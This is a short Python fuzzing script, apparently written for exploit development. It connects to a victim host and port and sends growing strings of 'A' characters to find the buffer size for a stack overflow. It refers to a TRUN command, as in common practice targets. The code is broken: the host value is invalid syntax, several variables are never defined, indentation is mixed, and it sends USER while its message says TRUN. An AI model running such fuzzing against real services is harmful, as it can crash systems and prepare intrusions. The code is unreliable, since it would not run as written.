#!/usr/bin/env python3

# A fuzzer for finding the buffer length
# By overwriting a local variable that is located near the vulnerable buffer on the stack, 
# in order to change the behavior of the program

import socket

victim_host = 0.0.0.0
victim_port = 0

for i in range(3000):
  FUZZ = 'A' * i
	establish = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connection = establish.connect((server, sport))
	print(s.recv(1024))
	s.send(('USER .' + FUZZ + '\r\n'))
	print(establish.recv(1024))
	print("Sending attack length ", len(FUZZ), ' to TRUN .')
	establish.send('EXIT\r\n')
	print(s.recv(1024))
s.close()
